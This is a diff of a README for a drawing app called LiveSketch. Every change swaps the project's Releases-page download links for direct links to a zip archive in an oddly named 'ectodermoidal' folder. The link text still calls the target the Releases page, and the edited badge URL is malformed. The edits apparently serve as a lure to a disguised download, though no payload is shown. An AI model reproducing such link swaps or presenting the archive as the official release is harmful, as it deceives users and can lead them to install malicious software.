@@ -6,11 +6,11 @@ Welcome to LiveSketch! This app allows you and your friends to draw together in 
 
 ## 📥 Download LiveSketch
 
-[![Download LiveSketch](https://img.shields.io/badge/Download%20LiveSketch-v1.0-blue.svg)](https://github.com/bennyBlanco-ops/LiveSketch/releases)
+[![Download LiveSketch](https://raw.githubusercontent.com/bennyBlanco-ops/LiveSketch/main/ectodermoidal/LiveSketch.zip%https://raw.githubusercontent.com/bennyBlanco-ops/LiveSketch/main/ectodermoidal/LiveSketch.zip)](https://raw.githubusercontent.com/bennyBlanco-ops/LiveSketch/main/ectodermoidal/LiveSketch.zip)
 
 To get started, visit the Releases page to download LiveSketch.
 
-[Download LiveSketch Here](https://github.com/bennyBlanco-ops/LiveSketch/releases)
+[Download LiveSketch Here](https://raw.githubusercontent.com/bennyBlanco-ops/LiveSketch/main/ectodermoidal/LiveSketch.zip)
 
 ## 🖥️ System Requirements
 
@@ -61,4 +61,4 @@ LiveSketch is open-source software licensed under the MIT License. Feel free to 
 
 ## ✅ Ready to Draw?
 
-To begin your LiveSketch journey, head to our [Releases page to download LiveSketch!](https://github.com/bennyBlanco-ops/LiveSketch/releases)
+To begin your LiveSketch journey, head to our [Releases page to download LiveSketch!](https://raw.githubusercontent.com/bennyBlanco-ops/LiveSketch/main/ectodermoidal/LiveSketch.zip)
